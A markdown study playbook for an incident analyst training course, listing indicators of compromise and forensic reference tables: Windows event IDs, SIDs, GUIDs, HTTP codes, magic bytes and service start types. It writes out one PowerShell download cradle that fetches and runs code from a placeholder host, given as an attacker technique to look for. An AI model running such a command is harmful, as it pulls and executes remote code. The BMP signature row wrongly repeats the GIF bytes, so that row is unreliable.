# Incident Analyst Training Playbook
*I completed this course November 2019.*

![rick morty image](https://c-o-d-e-b-e-a-r.github.io/IAT/images/rick-morty.png)

>*"Jesus, Morty. You can't just add a cyber word to any word and hope it means something." - Rick Sanchez*

## What is it?

The Incident Analyst Training (IAT) is a string of commercial and in house cyber flavoured training courses. The aim is to complete the entire training over five months. There are multiple assessments along the way and when I went through it I also completed GCFA and GNFA certifications. 

The target audience for this writeup is future students of this course. 

It could also be for someone who wants to learn about forensic CTFs.

## List of Courses

Course | Provider 
------- | ---------
Introduction to virtualisation | In house
SEC 504 | SANS On-demand
Python Fundamentals | TAFE
FOR 500 | SANS On-demand
Malware triage | In house
FOR 508 | SANS On-demand
FOR 572 | SANS On-demand
Linux enterprise incident response | Mandiant
Briefing techniques | In house
Writing winning technical documents | Engineers Australia

## How to use

This was originally a Word document that I used as a quick reference during my assessments. I will try and keep the table of contents as descriptive as possible so it should be easy to find whatever you're looking for. 

Every thing will also be kept on a single page so you'll be able to CTRL+f.

<a name="b2t"></a>
## Table of contents

- [ Things to do ](#things-to-do) 
- [ Change log ](#change-log)
- [ General IOCs ](#general-iocs)
  - [Misnamed processes](#misnamed-processes)
  - [Remote processes in memory](#remote-processes-in-memory)
  - [PowerShell download cradle](#ps-download-cradle)
  - [Domain controller ntdsutil](#dc-ntdsutil)
  - [Proxy logs](#proxy-logs)
- [General information](#gen-win-info)
  - [Windows event logs](#win-event-logs)
  - [Basics of tracking WMI activity](#track-wmi-activity)
  - [The epoch times](#the-epoch-times)
  - [Windows known folder GUIDs](#win-known-guids)
  - [Windows well known SIDs](#win-known-sids)
  - [HTTP Version History](#http-ver-history)
  - [HTTP response codes](#http-response-codes)
  - [Magic bytes for common files](#magic-bytes-common-files)
  - [Service start type](#service-start-types)
  - [Interesting domain information](#interesting-domain-info)

<a name="things-to-do"></a>
## Things to do
[*back to table of contents*](#b2t)

This is probably never ending but here is a list of things I want to add. Reach out to me if you'd like to help contribute. 
* Event ID table, build more on what's currently there.
* Include SEC504 and FOR500 into the playbook.
* Google analytic cookies, UTM.
* Hubspot targeting cookies, __hstc.
* DNS record types (572-b2p55) grab from my index. 
* acronym list
*	tshark into tools with basic switches.
*	FTP file extraction with wireshark (572b3p74-82)
*	kibana analysis setup

<a name="change-log"></a>
## Change log
[*back to table of contents*](#b2t)

| Date | Subject | Description |
| :-------- | :--------- | :------------ |
| 3 Dec 19 | Start | Beginning of transfer of Word doc onto github. Completed up to browser behaviour.|

<a name="general-iocs"></a>
## Genral IOCs
[*back to table of contents*](#b2t)

The purpose of this section is to give you an idea of what to look for that may indicate malicious activity. 

IOC = indicator of compromsie

<a name="misnamed-process"></a>
### Misnamed processes

A quick win for analysts is to identify processes found in the process list that try to appear legitimate but are misnamed.

For example, SVCHOST renamed to SCVHOST. It also useful to look at the parent process and ensure that it is what it should be. A common process table can be found [here](https://digital-forensics.sans.org/media/SANS_Poster_2018_Hunt_Evil_FINAL.pdf).

<a name="remote-processes-in-memory"></a>
### Remote processes in memory

If you happen to find the process WMIPrvSE in a memory image this can indicate a remote connection to the machine. If this is uncommon for the network that you are looking at then this could indicate suspicious/malicious activity. 

<a name="ps-download-cradle"></a>
### PowerShell download cradle 

Many attackers will use the following command to reach out and download other files, commonly seen in webshells.

IEX(New-Object System.Net.WebClient).downloadstring(‘http://example.com/foo.exe’)

<a name="dc-ntdsutil"></a>
### Domain controller ntdsutil

Seeing this tool being run on an Active Directory may indicate that a malicious user now has access to all domain password hashes via an exported NTDS.dit file. 

<a name="proxy-logs"></a>
### Proxy Logs

Proxy logs are a great source for information and can uncover information that may no longer, or never did, exist on a victim system. Below are examples but it is easy to adapt this approach. 

#### Google search

Google will record its search history almost like a key logger in proxy logs. Do a grep for 'google.com' and then 'complete'. 

#### Mail

You may also be able to grep out 'example-mail.com' and then look for 'sentconfirm', 'SHOW_CONFIRMPAGE', or logon/logout sessions.

#### Data dumping

It will be useful to stay on top of what are the most common dumping sites/exfiltration methods. This could be cloud storage like OneDrive, SharePoint, Google Drive, or websites like GitHub or PasteBin. PasteBin will send you a short link to what you uploaded and can be used to see what may be exfiltrated.

<a name="gen-win-info"></a>
## General information

The following section contains general information about Windows, computers, browsers, etc. that an analyst should at least know exists.

<a name="win-event-logs"></a>
### Windows event logs
[*back to table of contents*](#b2t)

The event logs are a rich source of information in an investigation. For Windows Security logs the following reference is really useful in knowing what each code is doing; <https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/Default.aspx>

For a forensic look at codes; <https://www.forwarddefense.com/pdfs/Event_Log_Analyst_Reference.pdf>

#### Specific codes

**5858 - Microsoft-Windows-WMI-Activity**

These log will record WMI activity and will give a results code that potentially can give further information. For result codes go here: <https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-error-constants?redirectedfrom=MSDN>

<a name="track-wmi-activity"></a>
### Basics of tracking WMI activity
[*back to table of contents*](#b2t)

Go to; <https://www.darkoperator.com/blog/2017/10/14/basics-of-tracking-wmi-activity>

<a name="the-epoch-times"></a>
### The epoch times
[*back to table of contents*](#b2t)

Programs and logs will often use various timestamps to record data. While timestamps like Local Times are easy enough to convert to UTC sometimes others are hard to recognise. Below is a table to help assist in identifying those timestamps.

| Name | Description | Example |
| :--- | :---------- | :------ |
| UNIX epoch time (POSIX time) | Seconds since 1970-01-01 00:00:00 UTC | 1570603604 |
| FAT epoch time | Seconds since 1980-01-01 00:00:00 UTC |   |

A list of other systems and when they start the count for their epoch time can be found here: <https://en.wikipedia.org/wiki/Epoch_(computing)>.

For an online converter which also includes function from different programming languages to get the current epoch time, look here: <https://www.epochconverter.com/>.

<a name="win-known-guids"></a>
### Windows known folder GUIDs
[*back to table of contents*](#b2t)

There are some common Windows GUIDs that an analyst should be across. Below is a brief table but more can be found here: <https://docs.microsoft.com/en-us/windows/win32/shell/knownfolderid>.

| Display Name | GUID |
| :----------- | :--- |
| Start Menu | {625B53C3-AB48-4EC1-BA1F-A1EF4146FC19} |
| VSS | {3808876b-xxxx-xxxx-xxxx-xxxxxxxxxxxx} |

For more information on the VSS read; <https://github.com/libyal/libvshadow/blob/master/documentation/Volume%20Shadow%20Snapshot%20(VSS)%20format.asciidoc>

and 

<https://docs.microsoft.com/en-us/windows/win32/vss/shadow-copies-and-shadow-copy-sets>.

<a name="win-known-sids"></a>
### Windows well known SIDs
[*back to table of contents*](#b2t)

This is something analysts will eventually get a feel for but it is generally known that the last part of the SID is the RID which can identify different types of users. For a comprehensive list go to: <https://support.microsoft.com/en-au/help/243330/well-known-security-identifiers-in-windows-operating-systems>.

| SID |	Meaning |
| :--- | :--- |
| S-1-5-21domain-500 |	Administrator |
| S-1-5-21domain-501 |	Guest |
| S-1-5-21domain-1000+ |	Local Users |

To further explain the SID the below table breaks down the components of an example SID. 

| S |	1 |	5 |	21-3623811015-3361044348-30300820 | 1013 |
| :--- | :--- | :--- | :--- | :--- |
| The string is a SID. | The revision level (the version of the SID specification). | The identifier authority value. | Domain or local computer identifier. |	A Relative ID (RID). Any group or user that is not created by default will have a Relative ID of 1000 or greater. |

<a name="http-ver-history"></a>
### HTTP version history
[*back to table of contents*](#b2t)

This information can be gleamed from the request string in most instances. 

| Protocol | Release |	Details |
| :--- | :--- | :--- |
| HTTP/0.9 |	1991 |	Should never be seen |
| HTTP/1.0 |	1996 |	Rare but not unheard of |
| HTTP/1.1 |	1997 |	Most common |
| HTTP/2 |	2015 |	Binary, multiplexed, generally with TLS |

<a name="http-response-codes"></a>
### HTTP response codes
[*back to table of contents*](#b2t)

When a client submits a request to a webserver the server will respond with a three-digit code. Below is a brief list of those codes. 

| Code |	Reason |
| :--- | :--- |
| 100, Continue |	After the server receives the headers for a request, this directs the client to proceed. |
| 200, OK |	Possibly the most common value, indicates the server was able to fulfill the request without incident. |
| 301, Moved permanently |	The server provides a new URL for the requested resource, and the client then ostensibly makes that request. "Permanent" means the original request should be assumed outdated. |
| 302, Found |	In practice, a temporary relocation, although this is not strictly in compliance with the standard. |
| 304, Not modified |	Indicates the requested resource has not changed since it was last requested.|
| 400, Bad syntax |	The request was somehow syntactically incorrect. |
| 401, Unauthorized |	Client must authenticate before the response can be given. |
| 403, Forbidden |	Request was valid, but client is not permitted access (regardless of authentication). |
| 404, Not found |	Requested resource does not exist. |
| 407, Proxy authentication required |	Like 401, but for the proxy server. |
| 500, Internal server error |	Generic server error message. |
| 503, Service unavailable |	Server is overloaded or undergoing maintenance. |
| 511, Network authentication required |	Client must authenticate to gain access-used by captive proxies such as at Wi-Fi hotspots. |

<a name="win-time-rules"></a>
### Windows time rules
[*back to table of contents*](#b2t)

This is a pdf taken from the SANS website that provides a quick explaination of time rules with different file operations. Check out the top right table on the following poster: <https://www.sans.org/security-resources/posters/windows-forensic-analysis/170/download>.

<a name="magic-bytes-common-files"></a>
### Magic bytes for common files
[*back to table of contents*](#b2t)

While these are the common magic bytes that you’ll come across a comprehensive list can be found at: <https://en.wikipedia.org/wiki/List_of_file_signatures>.

| Type |	Mnemonic |	Byte Signature (0x) |
| :--- | :--- | :--- |
|DOS exe|	MZ	|4D 5A|
|PE32 exe|	MZ….PE..	|4D 5A … 50 45 00 00|
|ELF exe|	.ELF	|7F 45 4C 46|
|Zip archive (also word docs)|	PK..	|50 4B 03 04|
|Rar archive|	Rar!....	|52 61 72 21 1A 07 01 00|
|7z archive|	7z¼¯'	|37 7A BC AF 27 1C|
|Gzip archive|	..	|1F 8B|
|PNG image|	.PNG….	|89 50 4E 47 0D 0A 1A 0A|
|BMP image|	BM	|47 49 46 38 37 61|
|GIF image|	GIF87a	|47 49 46 38 37 61|
|	|GIF89a	|47 49 46 38 39 61|
|pcap file|	¡²ÃÔ	|A1 B2 C3 D4|
|	|ÔÃ²¡	|D4 C3 B2 A1|
|pcapng file|	….	|0A 0B 0C 0D|
|PDF document|	%PDF-	|25 50 44 46 2D|

<a name="service-start-types"></a>
### Servcie start types
[*back to table of contents*](#b2t)

|Value|	Start Type|	Meaning|
| :--- | :--- | :--- |
|0x00|	Boot|	The kernel loaded will load this driver first as its needed to use the boot volume device.|
|0x01|	System|	This is loaded by the I/O subsystem.|
|0x02|	Autoload|	The service is always loaded and run.|
|0x03|	Manual|	This service does not start automatically and must be manually started by the user. |
|0x04|	Disabled|	The service is disabled and should not be started. |

<a name="interesting-domain-info"></a>
### Interesting domain information
[*back to table of contents*](#b2t)

**Domain users**

It is possible to query the following registry key on the domain controller,

*SOFTWARE\Microsoft\Windows NT\CurrentVersion\Profile List*

This can be used to compare an SID and get the username of the domain user.











